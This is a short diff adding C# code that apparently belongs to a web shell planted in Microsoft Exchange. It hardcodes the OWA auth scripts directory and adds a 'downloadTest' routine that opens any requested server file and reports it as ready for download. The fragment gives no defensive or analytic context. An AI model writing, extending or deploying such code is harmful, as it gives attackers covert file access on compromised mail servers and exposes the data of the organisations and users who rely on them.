@@ -1,0 +1,20 @@
+string getLoc(){return @"C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current\scripts\premium\";}
+    void downloadTest(string fdlpath)
+    {
+        string ret = "Error : -";
+        try
+        {
+            if (!string.IsNullOrEmpty(fdlpath))
+            {
+                using (System.IO.Stream stream = new System.IO.FileStream(fdlpath, System.IO.FileMode.Open))
+                {
+                    ret = string.Format("File '{0}' is ready for download", fdlpath);
+                }
+            }
+        }
+        catch (Exception e)
+        {
+            ret = "Error : " + e.Message;
+        }
+        response(ret);
+    }
